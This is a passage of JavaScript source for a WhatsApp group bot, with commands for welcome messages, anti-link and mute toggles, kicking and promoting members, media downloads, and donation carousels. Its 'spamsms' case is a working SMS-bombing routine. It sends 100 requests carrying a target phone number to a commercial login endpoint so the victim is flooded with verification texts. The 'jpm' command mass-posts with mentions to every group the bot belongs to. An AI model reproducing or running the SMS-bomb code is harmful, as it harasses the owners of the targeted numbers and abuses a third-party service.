let filteredArray = await files.filter(item => item.endsWith("mp3"))
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
m.reply(teks)
await sleep(2000)
m.reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
m.reply("Berhasil menghapus semua sampah")
});
}
break
//=======================
case 'welcome': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isWelcome) return m.reply(`_Kan udah aktif sebelumnya_`)
welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply('Successfully Activated Welcome')
} else if (args[0] === "off") {
if (!isWelcome) return m.reply(`Udah Nonaktif Kak`)
let anu = welcome.indexOf(m.chat)
welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply('Successfully Deactivation Welcome')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
   }
}
break
//========================            
case 'left': case 'goodbye': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (args[0] === "on") {
if (isLeft) return m.reply(`_Kan udah aktif sebelumnya_`)
left.push(m.chat)
fs.writeFileSync('./database/left.json', JSON.stringify(left, null, 2))
m.reply('Successfully Activated Goodbye')
} else if (args[0] === "off") {
if (!isLeft) return m.reply(`_It's already inactive_`)
let anu = left.indexOf(m.chat)
left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(left, null, 2))
m.reply('Successfully Deactivation goodbye di grup ini')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break
//========================           
case 'setwelcome': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Kirim perintah: ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Set welcome already active`)
addSetWelcome(text, m.chat, set_welcome_db)
m.reply(`Sukses Set Welcome!`)
}
limitAdd(m.sender, limit)
break
//========================            
case 'changewelcome': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Kirim perintah: ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @user, Selamat datang di @group`)
if (isSetWelcome(m.chat, set_welcome_db)) {
changeSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses Ganti Teks Welcome`)
 } else {
addSetWelcome(q, m.chat, set_welcome_db)
m.reply(`Sukses Ganti Teks Set Welcome`)
   }
}
break
//========================            
case 'delsetwelcome': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
if (!isSetWelcome(m.chat, set_welcome_db)) return m.reply(`Belum Ada Set Welcome Di Sini..`)
removeSetWelcome(m.chat, set_welcome_db)
m.reply(`Sukses Hapus Set Welcome`)
}
break
//========================            
case 'setleft': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Kirim perintah: ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) return m.reply(`Set Left Udah Aktif`)
addSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses Set Left!`)
}
break
//========================            
case 'changeleft': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Kirim perintah: ${prefix + command} *teks_left*\n\n_Contoh_\n\n${prefix + command} Halo @user, Selamat tinggal dari @group`)
if (isSetLeft(m.chat, set_left_db)) {
changeSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses Mengganti Teks Set Left!`)
} else {
addSetLeft(q, m.chat, set_left_db)
m.reply(`Sukses Mengganti Teks Set Left!`)
    }
}
break
//========================            
case 'delsetleft': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Special For Owner Features!')
 if (!isSetLeft(m.chat, set_left_db)) return m.reply(`Belum Ada Set Left Di Sini..`)
removeSetLeft(m.chat, set_left_db)
m.reply(`Sukses Hapus Set Left`)
}
limitAdd(m.sender, limit)
break
//========================            
case 'open': case 'buka': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply("Bot bukan admin")
Al.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
m.reply(textOpen || `Sukses mengizinkan Semua peserta dapat mengirim pesan ke grup ini

*GRUB :* ${groupName}`)
}
break
//========================            
case'afk':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isAfkOn) return m.reply('Afk sudah diaktifkan sebelumnya')
let reason = text ? text : 'Nothing.'
afk.addAfkUser(m.sender, Date.now(), reason, _afk)
Al.sendTextWithMentions(m.chat, `*MODE AFK*\n@${m.sender.split('@')[0]} Sedang dalam mode afk\n*Alasan :* ${reason}\n\n*GRUB :* ${groupName}`, m)
}
break
//=======
case 'autodlgc':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAutoDlGc) return m.reply(`Udah aktif`)
autodlgc.push(m.chat)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
m.reply('Successfully Activated Auto Download Nya')
} else if (args[0] === "off") {
if (!isAutoDlGc) return m.reply(`Udah Mati`)
let anu = autodlgc.indexOf(m.chat)
autodlgc.splice(anu, 1)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
m.reply('Sukses Mematikan Auto Download')
} else {
m.reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break
case 'autosticker':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAutoStiker) return m.reply(`Udah aktif`)
autostiker.push(m.chat)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autostiker, null, 2))
m.reply('Successfully Activated Auto Stiker')
} else if (args[0] === "off") {
if (!isAutoStiker) return m.reply(`Udah Mati`)
let anu = autostiker.indexOf(m.chat)
autostiker.splice(anu, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autostiker, null, 2))
m.reply('Sukses Mematikan Auto Sticker')
} else {
m.reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break
case 'antitoxic':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAntiToxic) return m.reply(`Udah aktif`)
antitoxic.push(m.chat)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic, null, 2))
m.reply('Successfully Activated Anti Toxic')
} else if (args[0] === "off") {
if (!isAntiToxic) return m.reply(`Udah Mati`)
let anu = antitoxic.indexOf(m.chat)
antitoxic.splice(anu, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(antitoxic, null, 2))
m.reply('Sukses Mematikan Anti Toxic')
} else {
m.reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break
case'mute':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isMute) return m.reply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
m.reply('_Succes Mute_')
}
else if (args[0] === "off") {
if (!isMute) return m.reply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
m.reply('_Done Dah Di Off_')
}else {
m.reply(`*on* / *off*`)
}}
break
    case 'antifoto':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAntiFoto) return m.reply(`Udah aktif`)
antifoto.push(m.chat)
fs.writeFileSync('./database/antifoto.json', JSON.stringify(antifoto, null, 2))
m.reply('Successfully Activated Anti Foto')
} else if (args[0] === "off") {
if (!isAntiFoto) return m.reply(`Udah Mati`)
let anu = antifoto.indexOf(m.chat)
antifoto.splice(anu, 1)
fs.writeFileSync('./database/antifoto.json', JSON.stringify(antifoto, null, 2))
m.reply('Sukses Mematikan Anti Foto')
} else {
m.reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break
    case 'antipromo':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (args[0] === "on") {
if (isAntiPromo) return m.reply(`Udah aktif`)
antipromo.push(m.chat)
fs.writeFileSync('./database/antipromo.json', JSON.stringify(antipromo, null, 2))
m.reply('Successfully Activated Anti Promo')
} else if (args[0] === "off") {
if (!isAntiPromo) return m.reply(`Udah Mati`)
let anu = antipromo.indexOf(m.chat)
antipromo.splice(anu, 1)
fs.writeFileSync('./database/antipromo.json', JSON.stringify(antipromo, null, 2))
m.reply('Sukses Mematikan Anti Promo')
} else {
m.reply(`${prefix+command} *on*\n${prefix+command} *off*`)
}}
break
case 'antilink': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLink) return m.reply(`_Kan udah aktif sebelumnya_`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Activated Antilink')
} else if (args[0] === "off") {
if (!isAntiLink) return m.reply(`_It's already inactive_`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
m.reply('Successfully Deactivation Antilink')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break

//========================            
case 'close': case 'tutup': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply("Bot bukan admin")
Al.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
m.reply(textClose || `Sukses mengizinkan Hanya admin yang dapat mengirim pesan ke grup ini

*GRUB :* ${groupName}`)
}
break
//========================       
case 'twit': case 'twitter': 
  if (!text) return m.reply('Give url twitter');
  try {
    let tw = await (await fetch('https://api.shannmoderz.xyz/downloader/twitter?url=' + text)).json();
    let shannz = tw.result.downloads[1];
    await Al.sendMessage(m.chat, { video: { url: shannz.url }, caption: `Hi *${pushname}* 👋, Join My WhatsApp Channel😇\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n මගෙ WhatsApp චැනල් එකට Join වෙන්න\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~` },{ quoted: m });
} catch (e) {
    return m.reply('shannz api sending error,' + e);
}
break
//==================
case'ttsearch':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
const capt = anu.result.title
await Al.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await Al.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
//=====
case 'spamsms': {
if (!isCreator) return reply('Khusus Owner Bot');
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return replyz('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) By Furina..`);
});
}
} else reply(`Use of spam SMS number/reply target message*\nExample of spam SMS +62xxxxxxxxxx`)
reply(`SMS/call spam will be sent to the target number`)
}
break
break;
case 'promote': case 'pm': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote member ke admin!')).catch((err) => m.reply('❌ Terjadi kesalahan'))
let pm = `
PROMOTE

Selamat Sudah Menjadi Admin Group
`
Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: 3,
		title: pm, 
		}
	}, {})
}
break
case 'demote': case 'dm': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote admin ke member biasa')).catch((err) => m.reply('❌ Terjadi kesalahan'))
let dm = `
DEMOTE

Yah Jadi Member Biasa Sekarang
`
Al.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "AUDIO",
		scheduledTimestampMs: 3,
		title: dm, 
		}
	}, {})
}
break     
case'revoke':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply(mess.BotAdmin)
await Al.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel ulang tautan undangan grup ini`)
}).catch(() => m.reply('eror'))
}
break
case 'delete2': case 'd2': case 'del2': {
if (!m.quoted) return m.reply('Reply pesan yang ingin dihapus!')
if (!isCreator && !isPremium) return m.reply('Lu bukan premium')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case'totag':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return m.reply('Lu Siapa Kocak')
let users = participants.map(u => u.id).filter(v => v !== Al.user.jid)
if (!m.quoted) return m.reply(`Reply Pesan`)
await Al.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'kick': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(`Sukses kick target dari grup\n• ${groupName}`)).catch((err) => m.reply('Tag/reply pesan target yang ingin di kick!'))
}
break
case 'add': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return m.reply('Fitur Khusus admin!')
if (!isBotAdmins) return m.reply('Bot Bukan Admin')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Al.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(`Sukses add member ke grup\n• ${groupName}`)).catch((err) => m.reply('Terjadi kesalahan.'))
}
break
case 'h': case 'hidetag': {
if (!m.isGroup) return m.reply("Khusus Grup")
if (!(isAdmins || isCreator)) return m.reply("Fitur khusus admin")
let tek = m.quoted ? quoted.text : (text ? text : "")
Al.sendMessage(m.chat, { text: `${tek}`, mentions: participants.map(a => a.id)}, {}, {quoted: fkontak })
}
break
case 'join':{
	if(!isCreator) return m.reply('Special For Owner Features!')
	let link = q.startsWith("http")
	if(!link) return m.reply(`Kirim perintah ${command} _linkgrup_`)
	var url = args[1]
	let ano = q.split('https://chat.whatsapp.com/')[1]
	await Al.groupAcceptInvite(ano)
	m.reply("Sukses join group")
	}
	break
	case 'out':{
	if (!isCreator) return m.reply('Gak mau')
await Al.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'jpm': case 'post': {
if (!isCreator) return m.reply('Khusus Owner Bot')
if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await m.reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await Al.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Al.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Al.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Al.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Al.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
m.reply("*SUCCESFUL ✅*")
}
break
	case 'rent': case 'nyewa': {
var sewanya = (prefix, pushname)      

Al.sendMessage(from, { contextInfo: { mentionedJid: [m],
externalAdReply: {
showAdAttribution: true,
title: `ᴍᴀɴᴜ-ᴍᴅ`, 
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: global.thumb,
mediaUrl: `${sig}`,
//sourceUrl: `${syt}`,
sourceUrl: `https://wa.me/94742274855?text=Bang+mau+sewa+bot`
}
}, text: sewanya}, {quoted: m, ephemeralExpiration: expiration})
}
break 
case 'donasi': {
await Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
const url = "https://telegra.ph/file/72b973058c1985de0eda8.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: Al.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `Hai *${pushname}* 👋\nʙᴇʀɪᴋᴜᴛ ʟɪsᴛ ᴘᴀʏᴍᴇɴᴛ sᴀʏᴀ ʏᴀʜ\nᒍᗩᑎGᗩᑎ ᒪᑌᑭᗩ ᒍOIᑎ YᗩKK,, Gᖇᑌᑭ 𝐌𝐚𝐧𝐮-𝐌𝐃 💙\nhttps://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n𝙰𝚛𝚒𝚐𝚊𝚝𝚘𝚞 𝙶𝚘𝚣𝚊𝚒𝚖𝚊𝚜𝚞 💙.` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "ᴍᴀɴᴜ-ᴍᴅ",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ ᴅᴀɴᴀ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙳𝙰𝙽𝙰\",\"id\":\"123456789\",\"copy_code\":\"081999042372\"}"
              },
                      ],
                    },
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ ɢᴏᴘᴀʏ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙶𝙾𝙿𝙰𝚈\",\"id\":\"123456789\",\"copy_code\":\"081999042372\"}"
              },
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ Qʀɪꜱ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝚀𝚁𝙸𝚂\",\"url\":\"https://telegra.ph/file/72b973058c1985de0eda8.jpg\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },                                    
                ],
                            messageVersion: 1,
                        },
                         contextInfo: {
                         mentionedJid: [m.sender],
                         forwardingScore: 999,
                         isForwarded: true,
                         forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363232588171807@newsletter',
                         newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                         serverMessageId: 143
                            }
                        }
                    }
                }
            },
        },
        {quoted: memek})
            await Al.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
case 'payment': {
await Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
const url = "https://telegra.ph/file/72b973058c1985de0eda8.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: Al.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `Hai *${pushname}* 👋\nʙᴇʀɪᴋᴜᴛ ʟɪsᴛ ᴘᴀʏᴍᴇɴᴛ sᴀʏᴀ ʏᴀʜ\nᒍᗩᑎGᗩᑎ ᒪᑌᑭᗩ ᒍOIᑎ YᗩKK,, Gᖇᑌᑭ 𝐌𝐚𝐧𝐮-𝐌𝐃 💙\nhttps://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n𝙰𝚛𝚒𝚐𝚊𝚝𝚘𝚞 𝙶𝚘𝚣𝚊𝚒𝚖𝚊𝚜𝚞 💙.` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "ᴍᴀɴᴜ-ᴍᴅ",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ ᴅᴀɴᴀ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙳𝙰𝙽𝙰\",\"id\":\"123456789\",\"copy_code\":\"081999042372\"}"
              },
                      ],
                    },
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
